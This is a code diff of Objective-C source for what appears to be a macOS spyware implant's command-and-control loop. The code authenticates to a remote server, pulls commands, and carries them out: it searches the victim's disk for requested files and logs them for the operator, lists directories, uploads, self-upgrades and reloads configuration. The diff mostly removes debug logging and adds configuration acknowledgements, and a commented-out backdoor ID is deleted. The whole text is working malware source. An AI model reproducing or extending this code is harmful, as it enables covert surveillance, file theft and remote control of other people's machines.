@@ -36,11 +36,7 @@
   if (self = [super init])
     {
       if (aConfiguration == nil)
-        {
-#ifdef DEBUG_PROTO
-          errorLog(@"configuration is nil");
-#endif
-          
+        {        
           [self release];
           return nil;
         }
@@ -52,10 +48,6 @@
       
       NSString *host      = [NSString stringWithCString: header->configString
                                                encoding: NSUTF8StringEncoding];
-      /*NSString *backdoorID  = [NSString stringWithCString:
-                               header->configString
-                               + strlen(header->configString)
-                               + 1];*/
       
 #ifdef DEBUG_PROTO
       warnLog(@"minDelay  : %d", mMinDelay);
@@ -84,24 +76,17 @@
 // Abstract Class Methods
 - (BOOL)perform
 {
-#ifdef DEBUG_PROTO
-  infoLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   // Init the transport
   RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                          onPort: 80];
   
-  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
-                                  initWithTransport: transport];
+  // Done.
+  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc] initWithTransport: transport];
+  
   if ([authOP perform] == NO)
-    {
-#ifdef DEBUG_PROTO
-      errorLog(@"Error on AUTH");
-#endif
-      
+    { 
       [authOP release];
       [transport release];
       [outerPool release];
@@ -110,15 +95,13 @@
     }
   
   [authOP release];
+  //
   
-  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc]
-                                  initWithTransport: transport];
+  // Done.
+  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc] initWithTransport: transport];
+  
   if ([idOP perform] == NO)
     {
-#ifdef DEBUG_PROTO
-      errorLog(@"Error on ID");
-#endif
-      
       [idOP release];
       [transport release];
       [outerPool release];
@@ -127,11 +110,9 @@
     }
   
   NSMutableArray *commandList = [[idOP getCommands] retain];
-  [idOP release];
   
-#ifdef DEBUG_PROTO
-  infoLog(@"commands available: %@", commandList);
-#endif
+  [idOP release];
+  //
   
   int i = 0;
   
@@ -141,155 +122,152 @@
       
       switch (command)
         {
-        case PROTO_NEW_CONF:
-          {
-            ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
-                                            initWithTransport: transport];
-            if ([confOP perform] == NO)
-              {
-#ifdef DEBUG_PROTO
-                errorLog(@"Error on CONF");
-#endif
-              }
-            
-            [confOP release];
-          } break;
-        case PROTO_DOWNLOAD:
-          {
-            DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
-                                                initWithTransport: transport];
-            if ([downOP perform] == NO)
-              {
-#ifdef DEBUG_PROTO
-                errorLog(@"Error on DOWNLOAD");
-#endif
-              }
-            else
-              {
-                NSArray *files = [downOP getDownloads];
+          // Done.
+          case PROTO_NEW_CONF:
+            {
+              ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc] initWithTransport: transport];
+              
+              if ([confOP perform] == NO)
+                {
+                  [confOP sendConfAck: PROTO_NO];
+                }
+              else
+                [confOP sendConfAck: PROTO_OK];
                 
-                if ([files count] > 0)
-                  {
-                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
-                    
-                    for (NSString *fileMask in files)
-                      {
-#ifdef DEBUG_PROTO
-                        infoLog(@"(PROTO_DOWNLOAD) Logging %@", fileMask);
-#endif
-                        
-                        NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
-                        if (filesFound == nil)
-                          {
-#ifdef DEBUG_PROTO
-                            errorLog(@"fileMask (%@) didn't match any files");
-#endif
-                            continue;
-                          }
-                        
-                        for (NSString *file in filesFound)
-                          {
-#ifdef DEBUG_PROTO
-                            infoLog(@"createLogForFile (%@)", file);
-#endif
-                            [fsManager logFileAtPath: file
-                                          forAgentID: LOG_DOWNLOAD];
-                          }
-                      }
-                    
-                    [fsManager release];
-                  }
-                else
-                  {
-#ifdef DEBUG_PROTO
-                    errorLog(@"(PROTO_DOWNLOAD) no file available");
-#endif
-                  }
-              }
-            
-            [downOP release];
-          } break;
-        case PROTO_UPLOAD:
-          {
-            UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
-                                            initWithTransport: transport];
-            
-            if ([upOP perform] == NO)
-              {
-#ifdef DEBUG_PROTO
-                errorLog(@"Error on UPLOAD");
-#endif
-              }
-            
-            [upOP release];
-          } break;
-        case PROTO_UPGRADE:
-          {
-            UpgradeNetworkOperation *upgradeOP = [[UpgradeNetworkOperation alloc]
+              [confOP release];
+            } break;
+          case PROTO_DOWNLOAD:
+            {
+              DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                   initWithTransport: transport];
-            
-            if ([upgradeOP perform] == NO)
-              {
+              if ([downOP perform] == NO)
+                {
 #ifdef DEBUG_PROTO
-                errorLog(@"Error on UPGRADE");
+                  errorLog(@"Error on DOWNLOAD");
 #endif
-              }
-            
-            [upgradeOP release];
-          } break;
-        case PROTO_FILESYSTEM:
-          {
-            FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
-                                        initWithTransport: transport];
-            if ([fsOP perform] == NO)
-              {
+                }
+              else
+                {
+                  NSArray *files = [downOP getDownloads];
+                  
+                  if ([files count] > 0)
+                    {
+                      RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                      
+                      for (NSString *fileMask in files)
+                        {
 #ifdef DEBUG_PROTO
-                errorLog(@"Error on FS");
+                          infoLog(@"(PROTO_DOWNLOAD) Logging %@", fileMask);
 #endif
-              }
-            else
-              {
-                NSArray *paths = [fsOP getPaths];
+                          
+                          NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
+                          if (filesFound == nil)
+                            {
 #ifdef DEBUG_PROTO
-                infoLog(@"paths: %@", paths);
+                              errorLog(@"fileMask (%@) didn't match any files");
 #endif
-                
-                if ([paths count] > 0)
-                  {
-                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
-                    
-                    for (NSDictionary *dictionary in paths)
-                      {
-                        NSString *path = [dictionary objectForKey: @"path"];
-                        uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
-                        
+                              continue;
+                            }
+                          
+                          for (NSString *file in filesFound)
+                            {
 #ifdef DEBUG_PROTO
-                        infoLog(@"(PROTO_FS) path : %@", path);
-                        infoLog(@"(PROTO_FS) depth: %d", depth);
+                              infoLog(@"createLogForFile (%@)", file);
 #endif
-                        
-                        [fsManager logDirContent: path
-                                       withDepth: depth];
-                      }
-                    
-                    [fsManager release];
-                  }
-                else
-                  {
+                              [fsManager logFileAtPath: file
+                                            forAgentID: LOG_DOWNLOAD];
+                            }
+                        }
+                      
+                      [fsManager release];
+                    }
+                  else
+                    {
 #ifdef DEBUG_PROTO
-                    errorLog(@"(PROTO_FS) no path availalble");
+                      errorLog(@"(PROTO_DOWNLOAD) no file available");
 #endif
-                  }
-              }
-            
-            [fsOP release];
-          } break;
-        default:
-          {
+                    }
+                }
+              
+              [downOP release];
+            } break;
+          case PROTO_UPLOAD:
+            {
+              UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
+                                              initWithTransport: transport];
+              
+              if ([upOP perform] == NO)
+                {
 #ifdef DEBUG_PROTO
-            errorLog(@"Received an unknown command (%d)", command);
+                  errorLog(@"Error on UPLOAD");
 #endif
-          } break;
+                }
+              
+              [upOP release];
+            } break;
+          case PROTO_UPGRADE:
+            {
+              UpgradeNetworkOperation *upgradeOP = [[UpgradeNetworkOperation alloc]
+                                                    initWithTransport: transport];
+              
+              if ([upgradeOP perform] == NO)
+                {
+#ifdef DEBUG_PROTO
+                  errorLog(@"Error on UPGRADE");
+#endif
+                }
+              
+              [upgradeOP release];
+            } break;
+          case PROTO_FILESYSTEM:
+            {
+              FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
+                                          initWithTransport: transport];
+              if ([fsOP perform] == NO)
+                {
+#ifdef DEBUG_PROTO
+                  errorLog(@"Error on FS");
+#endif
+                }
+              else
+                {
+                  NSArray *paths = [fsOP getPaths];
+#ifdef DEBUG_PROTO
+                  infoLog(@"paths: %@", paths);
+#endif
+                  
+                  if ([paths count] > 0)
+                    {
+                      RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                      
+                      for (NSDictionary *dictionary in paths)
+                        {
+                          NSString *path = [dictionary objectForKey: @"path"];
+                          uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
+                          
+#ifdef DEBUG_PROTO
+                          infoLog(@"(PROTO_FS) path : %@", path);
+                          infoLog(@"(PROTO_FS) depth: %d", depth);
+#endif
+                          
+                          [fsManager logDirContent: path
+                                         withDepth: depth];
+                        }
+                      
+                      [fsManager release];
+                    }
+                  else
+                    {
+#ifdef DEBUG_PROTO
+                      errorLog(@"(PROTO_FS) no path availalble");
+#endif
+                    }
+                }
+              
+              [fsOP release];
+            } break;
+          default:
+            break;
         }
     }
   
@@ -316,6 +294,7 @@
       errorLog(@"WTF error on BYE?!");
 #endif
     }
+    
   [byeOP release];
   
   //
@@ -326,16 +305,7 @@
   
   if (_taskManager.mShouldReloadConfiguration == YES)
     {
-#ifdef DEBUG_PROTO
-      warnLog(@"Loading new configuration");
-#endif
       [_taskManager reloadConfiguration];
-    }
-  else
-    {
-#ifdef DEBUG_PROTO
-      warnLog(@"No new configuration");
-#endif
     }
   
   [commandList release];
